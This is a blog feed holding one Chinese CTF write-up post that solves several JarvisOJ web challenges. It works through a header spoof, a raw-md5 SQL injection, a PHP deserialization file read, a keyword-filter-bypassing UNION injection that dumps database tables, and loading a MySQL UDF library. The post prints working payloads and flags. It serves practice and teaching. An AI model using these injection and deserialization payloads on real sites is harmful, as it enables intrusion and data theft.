<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Cy9nus&#39;s Blog</title>
  
  <subtitle>人如果没有梦想，跟咸鱼有什么区别</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://cy9nusg4rd3n.github.io/"/>
  <updated>2019-09-11T15:35:15.858Z</updated>
  <id>https://cy9nusg4rd3n.github.io/</id>
  
  <author>
    <name>Cy9nus</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>新学期新面貌</title>
    <link href="https://cy9nusg4rd3n.github.io/2019/09/11/%E6%96%B0%E5%AD%A6%E6%9C%9F%E6%96%B0%E9%9D%A2%E8%B2%8C/"/>
    <id>https://cy9nusg4rd3n.github.io/2019/09/11/新学期新面貌/</id>
    <published>2019-09-11T15:26:17.000Z</published>
    <updated>2019-09-11T15:35:15.858Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><del>我还是太懒了，已经半年没更新博客，跟个废人一样。</del>这个学期要振作起来！ 前天刚打完广东的强网杯，开始打时，醒来已经12多点，队友都差不多AK完了web,本菜鸡就只能玩了下MISC，然后就去摸鱼了，<strong>下面附上队友大腿的WP</strong><br><a href="https://lzy-wi.github.io/2019/09/11/qiangwangbei-GD-writewp/#more" target="_blank" rel="noopener">2019广东省强网杯writeup</a><br><a id="more"></a></p><ul><li>另外：舍友安利了一个不错的CTF平台，趁这段时间课少，刷些基础题来提升一下，记录这段时间web狗的学习过程</li></ul><h2 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h2><p>题目入口：<a href="http://web.jarvisoj.com:32770/" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a></p><ol><li>点击页面看到如下<blockquote><p>Please use port 51 to visit this site.</p></blockquote></li><li><p>以为用51端口访问，可是网页已经用了32770，改了之后访问不了的</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">单纯的我以为这样:</span><br><span class="line"><span class="symbol">http:</span><span class="comment">//web.jarvisoj.com:51/</span></span><br></pre></td></tr></table></figure></li><li><p>后来才知道是本地51端口访问,使用curl命令</p><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl --<span class="keyword">local</span>-port <span class="number">51</span> http:<span class="comment">//web.jarvisoj.com:32770/</span></span><br><span class="line"><span class="meta">#PCTF&#123;X_F0rw4rd_F0R_is_not_s3cuRe&#125;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="LOCALHOST"><a href="#LOCALHOST" class="headerlink" title="LOCALHOST"></a>LOCALHOST</h2><p>题目入口：<a href="http://web.jarvisoj.com:32774/" target="_blank" rel="noopener">http://web.jarvisoj.com:32774/</a><br><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost access only!!</span><br></pre></td></tr></table></figure></p><ol><li>X-Forwarded-For 127.0.0.1<blockquote><p>PCTF{X_F0rw4rd_F0R_is_not_s3cuRe}</p></blockquote></li></ol><h2 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h2><p>题目入口：<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">http://web.jarvisoj.com:32772/</a><br><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要密码才能获得<span class="built_in">flag</span>哦。</span><br></pre></td></tr></table></figure></p><ol><li>进入看到一个提交密码的输入框</li><li>随便输入字符(包括非法字符)都只返回<strong>Wrong Password.</strong></li><li><p>查看response发现</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hint:"<span class="keyword">select</span> * <span class="keyword">from</span> <span class="symbol">`admin`</span> <span class="keyword">where</span> <span class="keyword">password</span>=<span class="string">'".md5($pass,true)."'</span><span class="string">"</span></span><br></pre></td></tr></table></figure></li><li><p>关键在于md5($pass,true)</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">md5(string,raw)</span><br><span class="line"></span><br><span class="line">string 必需。规定要计算的字符串。 </span><br><span class="line"></span><br><span class="line">raw 可选。规定十六进制或二进制输出格式： </span><br><span class="line"></span><br><span class="line">•  <span class="literal">TRUE</span> – 原始 16 字符二进制格式</span><br><span class="line"></span><br><span class="line">•  <span class="literal">FALSE</span> – 默认。32 字符十六进制数如果md5计算后的值经过hex转成字符串后为 ”<span class="keyword">or</span>’xxx’这样的字符串,则拼接后构成的语句为：</span><br><span class="line"></span><br><span class="line">select * <span class="keyword">from</span> `admin` where <span class="attribute">password</span>=”or’xxx’</span><br></pre></td></tr></table></figure></li><li><p>所以我们要找一个字符串使得md5()后再decode(‘hex’)得到有’</p></li><li>下面提供两个payload<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">content</span>: 129581926211651571912466741651878684928 </span><br><span class="line"></span><br><span class="line"><span class="attribute">hex</span>: 06da5430449f8f6f23dfc1276f722738 </span><br><span class="line"></span><br><span class="line"><span class="attribute">raw</span>: ?T0D??o#??’or’8.N=?</span><br><span class="line"></span><br><span class="line"><span class="attribute">content</span>: ffifdyop </span><br><span class="line"></span><br><span class="line"><span class="attribute">hex</span>: 276f722736c95d99e921722cf9ed621c </span><br><span class="line"></span><br><span class="line"><span class="attribute">raw</span>: ‘or’6蒥欓!r,b</span><br></pre></td></tr></table></figure></li></ol><p><a href="https://www.freebuf.com/column/150063.html" target="_blank" rel="noopener">参考资料</a></p><ol start="7"><li>最后密码输入ffifdyop<blockquote><p>PCTF{R4w_md5_is_d4ng3rous}</p></blockquote></li></ol><h2 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h2><p>题目入口：<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？</span><br></pre></td></tr></table></figure></p><ol><li><p>刷新页面时F12在Network中看到<strong>showimg.php?img=c2hpZWxkLmpwZw==</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">以下为后面所用到的信息</span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="string">'c2hpZWxkLmpwZw=='</span>.decode(<span class="string">'base64'</span>)</span><br><span class="line"><span class="string">'shield.jpg'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="string">'showimg.php'</span>.encode(<span class="string">'base64'</span>)</span><br><span class="line"><span class="string">'c2hvd2ltZy5waHA=\n'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="string">'index.php'</span>.encode(<span class="string">'base64'</span>)</span><br><span class="line"><span class="string">'aW5kZXgucGhw\n'</span></span><br><span class="line"><span class="meta">&gt;&gt;</span>&gt; <span class="string">'shield.php'</span>.encode(<span class="string">'base64'</span>)</span><br><span class="line"><span class="string">'c2hpZWxkLnBocA==\n'</span></span><br></pre></td></tr></table></figure></li><li><p>读取showing.php内容:/showimg.php?img=c2hvd2ltZy5waHA=</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$f = $_GET[<span class="string">'img'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">empty</span>($f)) &#123;</span></span><br><span class="line"><span class="php">$f = base64_decode($f);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (stripos($f,<span class="string">'..'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos($f,<span class="string">'\\'</span>)===<span class="keyword">FALSE</span></span></span><br><span class="line"><span class="php">&amp;&amp; stripos($f,<span class="string">'pctf'</span>)===<span class="keyword">FALSE</span>) &#123;</span></span><br><span class="line"><span class="php">readfile($f);</span></span><br><span class="line"><span class="php">&#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"File not found!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>没发现关于flag内容，读取index.php内容:/showimg.php?img=aW5kZXgucGhw</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?php </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'shield.php'</span>);</span><br><span class="line">$x = <span class="keyword">new</span> Shield();</span><br><span class="line"><span class="keyword">isset</span>($_GET[<span class="string">'class'</span>]) &amp;&amp; $g = $_GET[<span class="string">'class'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>($g)) &#123;</span><br><span class="line">$x = unserialize($g);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $x---&gt;</span><br></pre></td></tr></table></figure></li><li><p>index.php也没有出现与Flag相关的信息，但是index.php读取的class参数的值，并且没有对参数进行过滤</p></li><li><p>读取shield.php内容,/showimg.php?img=c2hpZWxkLnBocA==</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">//flag is in pctf.php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">public</span> $file;</span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">''</span>)</span> </span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">$this</span> -&gt; file = $filename;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span></span><br><span class="line"><span class="php">&amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>可以看到flag在pctf.php中,但做了过滤无法直接读取,考虑到index.php做了反序列化操作,并且在进行初始化的时候，将$filename赋值为pctf.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">'pctf.php'</span>)</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>构造序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Shield</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $file;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($filename = <span class="string">'pctf.php'</span>)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span> -&gt; file = $filename;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">readfile</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>  </span><br><span class="line">            &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> @file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">$x = <span class="keyword">new</span> Shield();</span><br><span class="line"><span class="keyword">echo</span> serialize($x);</span><br><span class="line"></span><br><span class="line"><span class="comment">#O:6:"Shield":1:&#123;s:4:"file";s:8:"pctf.php";&#125;</span></span><br></pre></td></tr></table></figure></li><li><p>最终payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://web.jarvisoj.com:32768/index.php?class=O:6:%22Shield%22:1:&#123;s:4:%22file%22;s:8:%22pctf.php%22;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--?php </span></span><br><span class="line"><span class="comment">//Ture Flag : PCTF&#123;W3lcome_To_Shi3ld_secret_Ar3a&#125;</span></span><br><span class="line"><span class="comment">//Fake flag:</span></span><br><span class="line"><span class="comment">echo "FLAG: PCTF&#123;I_4m_not_fl4g&#125;"</span></span><br><span class="line"><span class="comment">?--&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="IN-A-MESS"><a href="#IN-A-MESS" class="headerlink" title="IN A MESS"></a>IN A MESS</h2><p>题目入口：<a href="http://web.jarvisoj.com:32780/" target="_blank" rel="noopener">http://web.jarvisoj.com:32780/</a></p><blockquote><p>连出题人自己都忘了flag放哪了，只记得好像很混乱的样子。</p></blockquote><ol><li><p>查源码发现index.phps</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">error_reporting(<span class="number">0</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">"&lt;!--index.phps--&gt;"</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(!$_GET[<span class="string">'id'</span>])</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php">header(<span class="string">'Location: index.php?id=1'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">exit</span>();</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$id=$_GET[<span class="string">'id'</span>];</span></span><br><span class="line"><span class="php">$a=$_GET[<span class="string">'a'</span>];</span></span><br><span class="line"><span class="php">$b=$_GET[<span class="string">'b'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(stripos($a,<span class="string">'.'</span>))</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">echo</span> <span class="string">'Hahahahahaha'</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">return</span> ;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php">$data = @file_get_contents($a,<span class="string">'r'</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>($data==<span class="string">"1112 is a nice lab!"</span> <span class="keyword">and</span> $id==<span class="number">0</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"111"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"1114"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">4</span>)</span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">require</span>(<span class="string">"flag.txt"</span>);</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="keyword">else</span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">print</span> <span class="string">"work harder!harder!harder!"</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>下面构造payload</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">id可以用弱类型来解决 id=<span class="number">0</span>b</span><br><span class="line">eregi函数可以用<span class="comment">%00截断 b=%0011111</span></span><br><span class="line">难点在于a,可用php://input,然后post数据<span class="number">1112</span> is a nice lab!</span><br><span class="line">也可以data协议a=data:,<span class="number">1112</span> is a nice lab!</span><br><span class="line"></span><br><span class="line">#返回： Come ON!!! &#123;/^HT2mCpcvOLf&#125;</span><br></pre></td></tr></table></figure></li><li><p>然而这并不像flag,而是路径，访问之自动跳到<a href="http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1" target="_blank" rel="noopener">http://web.jarvisoj.com:32780/%5EHT2mCpcvOLf/index.php?id=1</a></p><blockquote><p>回显:hi666</p></blockquote></li><li><p>更改id发现</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">id=2</span><br><span class="line">回显:<span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">content</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="number">2</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">1</span><span class="string">'or'</span><span class="number">1</span><span class="string">'='</span><span class="number">1</span> <span class="comment">#</span></span><br><span class="line">回显:you bad boy/girl!</span><br></pre></td></tr></table></figure></li><li><p>明显的sql注入了,而且过滤了很多关键字和空格，尝试用双写和/*1*/代替</p><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>seselectlect<span class="comment">/*1*/</span><span class="number">1</span><span class="meta">#</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>seselectlect<span class="comment">/*1*/</span><span class="number">1</span>,<span class="number">2</span><span class="meta">#</span></span><br><span class="line"><span class="keyword">id</span>=<span class="number">-1</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>seselectlect<span class="comment">/*1*/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="meta">#</span></span><br><span class="line">到这回显<span class="number">3</span>，说明有<span class="number">3</span>个字段</span><br><span class="line"></span><br><span class="line">查库:<span class="keyword">id</span>=<span class="number">-1</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>seselectlect<span class="comment">/*1*/</span><span class="number">1</span>,<span class="number">2</span>,database()<span class="meta">#</span></span><br><span class="line">回显:test</span><br><span class="line"></span><br><span class="line">查表:<span class="keyword">id</span>=<span class="number">-1</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>seselectlect<span class="comment">/*1*/</span><span class="number">1</span>,<span class="number">2</span>,(seselectlect<span class="comment">/*1*/</span>group_concat(table_name)<span class="comment">/*1*/</span>frfromom<span class="comment">/*1*/</span>information_schema.tables<span class="comment">/*1*/</span>where<span class="comment">/*1*/</span>table_schema=database())%<span class="number">23</span></span><br><span class="line">回显:content</span><br><span class="line"></span><br><span class="line">查列:<span class="number">-1</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>seselectlect<span class="comment">/*1*/</span><span class="number">1</span>,<span class="number">2</span>,(seselectlect<span class="comment">/*1*/</span>group_concat(column_name)<span class="comment">/*1*/</span>frfromom<span class="comment">/*1*/</span>information_schema.columns<span class="comment">/*1*/</span>where<span class="comment">/*1*/</span>table_name=<span class="number">0x636f6e74656e74</span>)%<span class="number">23</span></span><br><span class="line">回显:<span class="keyword">id</span>,context,title</span><br><span class="line"></span><br><span class="line">查内容:<span class="keyword">id</span>=<span class="number">-1</span><span class="comment">/*1*/</span>uniunionon<span class="comment">/*1*/</span>seselectlect<span class="comment">/*1*/</span><span class="number">1</span>,<span class="number">2</span>,(seselectlect<span class="comment">/*1*/</span>context<span class="comment">/*1*/</span>frfromom<span class="comment">/*1*/</span>content)%<span class="number">23</span></span><br><span class="line">回显:PCTF&#123;Fin4lly_U_got_i7_C0ngRatulation5&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="RE"><a href="#RE" class="headerlink" title="RE?"></a>RE?</h2><blockquote><p>咦，奇怪，说好的WEB题呢，怎么成逆向了？不过里面有个help_me函数挺有意思的哦</p></blockquote><ol><li>这道题完全复现别人的，挺有意思的，没有链接，只给了一个文件<a href="https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172" target="_blank" rel="noopener">udf.so.02f8981200697e5eeb661e64797fc172</a></li><li><p>关于UDF的介绍</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">UDF是mysql的一个拓展接口，UDF（Userdefined <span class="function"><span class="keyword">function</span>）可翻译为用户自定义函数，这个是用来拓展<span class="title">Mysql</span>的技术手段。</span></span><br><span class="line"></span><br><span class="line">简单来说，udf是为了拓展功能而可以自行添加函数，不过添加的函数为恶意函数就能导致代码执行。</span><br><span class="line"></span><br><span class="line">OK，返回题目，题目给出的提示是“不过里面有个help_me函数挺有意思的哦”，那就是说这里需要创建自定义函数了。</span><br><span class="line"></span><br><span class="line">创建自定义函数的语法：<span class="built_in">create</span> <span class="function"><span class="keyword">function</span> 函数名 <span class="title">returns</span> <span class="title">string</span> <span class="title">soname</span> ‘导出的<span class="title">DLL</span>路径’；</span></span><br></pre></td></tr></table></figure></li><li><p>在Ubuntu上下载文件</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget <span class="string">https:</span><span class="comment">//dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172</span></span><br></pre></td></tr></table></figure></li><li><p>拷贝至/usr/lib/mysql/plugin,然后启动mysql服务并登陆</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">service mysql <span class="literal">start</span></span><br><span class="line">mysql -u root -p</span><br></pre></td></tr></table></figure></li><li><p>创建题目提示的自定义函数并访问</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysql;</span><br><span class="line">Reading table information for completion of table and column names</span><br><span class="line">You can turn off this feature to get a quicker startup with -A</span><br><span class="line"></span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; create function help<span class="emphasis">_me returns string soname 'udf.so.02f8981200697e5eeb661e64797fc172';</span></span><br><span class="line"><span class="emphasis">ERROR 1125 (HY000): Function 'help_</span>me' already exists</span><br><span class="line">mysql&gt; select help<span class="emphasis">_me();</span></span><br><span class="line"><span class="emphasis">+---------------------------------------------+</span></span><br><span class="line"><span class="emphasis">| help_</span>me()                                   |</span><br><span class="line"><span class="code">+---------------------------------------------+</span></span><br><span class="line">| use getflag function to obtain your flag!!</span><br><span class="line"><span class="code"> |</span></span><br><span class="line"><span class="code">+---------------------------------------------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create function getflag returns string soname <span class="emphasis">'udf.so.02f8981200697e5eeb661e64797fc172'</span>;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select getflag();</span><br><span class="line"><span class="code">+------------------------------------------+</span></span><br><span class="line">| getflag()                                |</span><br><span class="line"><span class="code">+------------------------------------------+</span></span><br><span class="line">| PCTF&#123;Interesting<span class="emphasis">_U5er_</span>d3fined<span class="emphasis">_Function&#125;</span></span><br><span class="line"><span class="emphasis"> |</span></span><br><span class="line"><span class="emphasis">+------------------------------------------+</span></span><br><span class="line"><span class="emphasis">1 row in set (0.00 sec)</span></span><br></pre></td></tr></table></figure></li></ol><h1 id="end"><a href="#end" class="headerlink" title="end"></a>end</h1><p>今天就写到这把，题目不难，很基础算开学初找下手感把。<del>其实还是太累了不想做啊</del></p>]]></content>
    
    <summary type="html">
    
